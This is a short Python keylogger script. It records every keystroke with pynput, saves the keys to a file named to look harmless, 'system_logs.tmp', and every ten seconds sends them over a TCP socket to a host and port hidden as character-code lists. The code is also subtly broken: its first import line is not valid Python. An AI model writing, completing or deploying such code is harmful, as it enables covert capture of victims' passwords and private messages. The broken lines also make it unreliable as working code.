import __import__('pynput.keyboard')
import socket
import os
import threading

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if str(key) == 'Key.space':
            log += ' '
        else:
            log += f'({str(key)})'

def write_file(text):
    with open('system_logs.tmp', 'a') as f:
        f.write(text)

def send_logs():
    global log
    server_ip = ''.join(chr(x) for x in [49, 57, 50, 46, 48, 46, 48, 46, 49])
    port = int(''.join(chr(x) for x in [57, 48, 48, 48]))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, port))
        s.send(log.encode())
        print(f'Debug: Sent logs to {server_ip}:{port}')
        s.close()
    except Exception as e:
        print(f'Debug: Failed to send logs - {e}')

def report():
    global log
    write_file(log)
    send_logs()
    log = ""
    timer = threading.Timer(10, report)
    timer.start()

with __import__('pynput.keyboard').Listener(on_press=on_press) as listener:
    report()
    listener.join()